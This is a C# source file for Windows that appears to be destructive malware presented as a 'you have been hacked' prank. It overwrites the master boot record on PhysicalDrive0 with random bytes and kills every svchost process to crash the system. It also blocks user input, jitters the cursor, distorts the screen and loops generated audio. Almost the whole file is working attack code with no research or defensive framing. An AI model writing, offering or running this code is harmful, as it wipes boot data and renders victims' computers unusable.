using System;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;

class Abolhb
{
    [DllImport("user32.dll")]
    static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("user32.dll")]
    static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
    [DllImport("gdi32.dll")]
    static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int nIndex);
    [DllImport("user32.dll")]
    static extern bool BlockInput(bool fBlockIt);
    [DllImport("user32.dll")]
    static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")]
    static extern bool GetCursorPos(out POINT lpPoint);
    const uint ROP_CODE = 0x999899;
    const int SM_CXSCREEN = 0;
    const int SM_CYSCREEN = 1;
    const int MBR_SIZE = 512;

    [StructLayout(LayoutKind.Sequential)]
    public struct POINT
    {
        public int X;
        public int Y;
    }
    static void Main()
    {
        Task.Factory.StartNew(() => Mattia.PlayBytebeatAudioLoop());
        PrintText("YOU HAVE BEEN HACKED");
        Task.Delay(120000).ContinueWith(t => MasonBSOD());
        Random rand = new Random();
        IntPtr hdc = GetDC(IntPtr.Zero);
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        POINT cursor;
        MasonMBR();
        while (true)
        {
            GetCursorPos(out cursor);
            int X = cursor.X + rand.Next(-1, 2);
            int Y = cursor.Y + rand.Next(-1, 2);
            BlockInput(true);
            SetCursorPos(X, Y);
            hdc = GetDC(IntPtr.Zero);
            int randOffset1 = rand.Next(5);
            int randOffset2 = rand.Next(5);
            BitBlt(hdc, 0, 20 + randOffset1, screenWidth, screenHeight, hdc, 0, -20 + randOffset2, ROP_CODE);
            BitBlt(hdc, 0, -20 + randOffset2, screenWidth, screenHeight, hdc, 0, 20 + randOffset1, ROP_CODE);
            ReleaseDC(IntPtr.Zero, hdc);
            Thread.Sleep(5);
            BlockInput(false);
        }
    }
    private static void PrintText(string text)
    {
        using (Graphics g = Graphics.FromHwnd(IntPtr.Zero))
        {
            Font font = new Font("Impact", 100);
            SizeF textSize = g.MeasureString(text, font);
            int x = (GetSystemMetrics(SM_CXSCREEN) - (int)textSize.Width) / 2;
            int y = (GetSystemMetrics(SM_CYSCREEN) - (int)textSize.Height) / 2;
            g.DrawString(text, font, Brushes.Red, new PointF(x, y)); 
        }
    }
    private static void MasonMBR()
    {
        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
        {
            byte[] mbrData = new byte[MBR_SIZE];
            Random rand = new Random();
            rand.NextBytes(mbrData);
            fs.Write(mbrData, 0, MBR_SIZE);
        }
    }
    private static void MasonBSOD()
    {
        var processes = Process.GetProcessesByName("svchost");
        foreach (var process in processes)
        {
            try
            {
                process.Kill();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error killing svchost.exe: {ex.Message}");
            }
        }
    }
}
class Mattia
{
    private const int SampleRate = 9489;
    private const int DurationSeconds = 10;
    private const int BufferSize = SampleRate * DurationSeconds;

    private static Func<int, int>[] formulas = new Func<int, int>[] {
        t => (t >> 3 | t >> 9) + ((t >> 2) & 33),
        t => (t >> 5 & 13) * (t >> 33 & 7),
        t => (t >> 89 | t >> 11) ^ (t >> 17)
    };
    public static Func<int, int>[] Formulas { get => formulas; set => formulas = value; }
    private static byte[] GenerateBuffer(Func<int, int> formula)
    {
        byte[] buffer = new byte[BufferSize];
        for (int t = 0; t < BufferSize; t++)
        {
            buffer[t] = (byte)(formula(t) & 0xFF);
        }
        return buffer;
    }
    private static void SaveWav(byte[] buffer, string filePath)
    {
        using (var fs = new FileStream(filePath, FileMode.Create))
        using (var bw = new BinaryWriter(fs))
        {
            bw.Write(new[] { 'R', 'I', 'F', 'F' });
            bw.Write(36 + buffer.Length);
            bw.Write(new[] { 'W', 'A', 'V', 'E' });
            bw.Write(new[] { 'f', 'm', 't', ' ' });
            bw.Write(16);
            bw.Write((short)1);
            bw.Write((short)1);
            bw.Write(SampleRate);
            bw.Write(SampleRate);
            bw.Write((short)1);
            bw.Write((short)8);
            bw.Write(new[] { 'd', 'a', 't', 'a' });
            bw.Write(buffer.Length);
            bw.Write(buffer);
        }
    }
    private static void PlayBufferLoop(byte[] buffer)
    {
        string tempFilePath = Path.GetTempFileName();
        SaveWav(buffer, tempFilePath);

        using (SoundPlayer player = new SoundPlayer(tempFilePath))
        {
            player.PlayLooping();
            Thread.Sleep(Timeout.Infinite);
        }
        File.Delete(tempFilePath);
    }
    public static void PlayBytebeatAudioLoop()
    {
        foreach (var formula in Formulas)
        {
            byte[] buffer = GenerateBuffer(formula);
            PlayBufferLoop(buffer);
        }
    }
}
